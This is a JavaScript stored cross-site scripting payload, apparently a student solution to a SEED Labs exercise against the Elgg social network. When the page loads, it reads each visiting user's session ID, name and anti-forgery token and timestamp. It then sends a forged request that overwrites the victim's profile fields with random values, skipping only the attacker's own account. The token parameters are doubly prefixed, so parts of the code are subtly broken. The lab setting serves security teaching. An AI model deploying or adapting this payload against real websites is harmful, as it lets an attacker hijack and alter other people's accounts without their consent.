<script type="text/javascript">
	window.onload = function(){
		// JavaScript code to access user name, user guid, Time Stamp __elgg_ts
		// and Security Token __elgg_token
		var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
		var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
		// Construct the content of your url.
		var samyguid = 59;
		var userguid = elgg.session.user.guid;
		var usrrname = elgg.session.user.name;
		var roll = 1905067 ; 
		var sendurl = "http://www.seed-server.com/action/profile/edit";
		
		var content = "__elgg_token=" + token + "&__elgg_ts=" + ts +
			"&name="+usrrname+"&description="+roll+"&accesslevel[description]=1" + 
			"&briefdescription=" + generateRandomString() + "&accesslevel[briefdescription]=1" +
			"&location=" + generateRandomString() + "&accesslevel[location]=1" +
			"&interests=" + generateRandomString() + "&accesslevel[interests]=1" +
			"&skills=" + generateRandomString() + "&accesslevel[skills]=1" +
			"&contactemail=" + generateRandomString()+"@gmail.com" + "&accesslevel[contactemail]=1" +
			"&phone=" + generateRandomString() + "&accesslevel[phone]=1" +
			"&mobile=" + generateRandomString() + "&accesslevel[mobile]=1" +
			"&website=" + generateRandomString()+".com" + "&accesslevel[website]=1" +
			"&twitter=" + generateRandomString() + "&accesslevel[twitter]=1" +
			"&guid=" + userguid;


		// the solution can also be done using formdata 
		var formData = new FormData();
		formData.append("__elgg_token", token);
		formData.append("__elgg_ts", ts);
		formData.append("name", usrrname);
		formData.append("description", roll);
		formData.append("accesslevel[description]", 1);
		formData.append("briefdescription", generateRandomString());
		formData.append("accesslevel[briefdescription]", 1);
		formData.append("location", generateRandomString());
		formData.append("accesslevel[location]", 1);
		formData.append("interests", generateRandomString());
		formData.append("accesslevel[interests]", 1);
		formData.append("skills", generateRandomString());
		formData.append("accesslevel[skills]", 1);
		formData.append("contactemail", generateRandomString()+"@gmail.com");
		formData.append("accesslevel[contactemail]", 1);
		formData.append("phone", generateRandomString());
		formData.append("accesslevel[phone]", 1);
		formData.append("mobile", generateRandomString());
		formData.append("accesslevel[mobile]", 1);
		formData.append("website", generateRandomString()+".com");
		formData.append("accesslevel[website]", 1);
		formData.append("twitter", generateRandomString());
		formData.append("accesslevel[twitter]", 1);
		formData.append("guid", userguid);
		
		if(userguid != samyguid) {
			// Create and send Ajax request to modify profile
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST", sendurl, true);
			Ajax.setRequestHeader("Host", "www.seed-server.com");
			Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
			Ajax.send(content);
			//Ajax.send(formData);

		}
	}

	function generateRandomString() {
		return Math.random().toString(36).substring(7);
	}
</script>
